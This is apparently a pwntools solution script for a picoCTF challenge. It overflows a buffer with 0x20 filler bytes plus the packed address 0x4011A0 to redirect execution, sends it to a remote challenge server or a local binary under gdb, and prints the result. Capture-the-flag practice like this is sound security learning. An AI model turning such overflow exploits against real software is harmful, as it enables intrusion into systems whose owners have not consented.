from pwn import *

context.arch = 'amd64'
context.terminal = ('kgx', '-e')

if args.REMOTE:
    r = remote('mimas.picoctf.net', 64221)
else:
    r = gdb.debug('./chall', '''
                    b main
                    c
    ''')

r.sendlineafter(b'choice: ', b'2')
r.sendlineafter(b'buffer: ', b'a'*0x20 + p64(0x4011A0))

r.sendlineafter(b'choice: ', b'4')

print(r.recvall(timeout=1).decode())